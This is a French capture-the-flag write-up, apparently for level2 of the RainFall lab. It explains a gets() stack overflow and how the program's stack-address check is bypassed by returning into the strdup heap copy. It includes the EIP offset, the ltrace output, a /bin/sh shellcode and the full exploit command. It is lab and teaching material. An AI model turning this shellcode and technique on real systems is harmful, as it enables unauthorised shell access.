## Le programme
Le programme appelle la fonction p, qui fait un gets, un puts puis un strdup. Avant le puts, le programme s'assure qu'on a pas overwrite le EIP save pour le faire pointer vers notre buffer.

## La faille
La faille reside dans l'utilisation de la fonction gets, qui ne prend pas en compte la taille du buffer passe en parametre. On peut utiliser cette faille par exemple pour overwrite le EIP save de p et executer le code qu'on veut lorsque p retourne.

Cependant, le programme s'assure qu'on overwrite pas EIP pour le faire pointer vers notre buffer. Il faudra donc trouver autre chose. L'adresse renvoyee par malloc pour le strdup est deterministe et toujours la meme. On pourra faire pointer EIP vers cette adresse.

## Determiner l'offset de EIP
Pour determiner l'offset de EIP on utilisera un buffer overflow pattern: https://wiremask.eu/tools/buffer-overflow-pattern-generator/

offset=80

## Determiner l'adresse du resultat de strdup
Pour determiner l'adresse vers lequel EIP sera redirige, on peut utiliser ltrace:
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff724, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                     = 0
gets(0xbffff62c, 0, 0, 0xb7e5ec73, 0x80482b5lkjsadlksajflkjsalkjflkajfdslkfjalkjflkdsjlkjsf
)          = 0xbffff62c
puts("lkjsadlksajflkjsalkjflkajfdslkfj"...lkjsadlksajflkjsalkjflkajfdslkfjalkjflkdsjlkjsf
)            = 48
strdup("lkjsadlksajflkjsalkjflkajfdslkfj"...)          = 0x0804a008
+++ exited (status 8) +++
```

> 0x0804a008

## Le shellcode
Voici le shellcode qu'on va utiliser, qui execute /bin/sh:
> \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

## Final
```
$> printf "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab\x08\xa0\x04\x08\x00\n" > /tmp/level2.txt
$> cat /tmp/level2.txt - | ./level2
```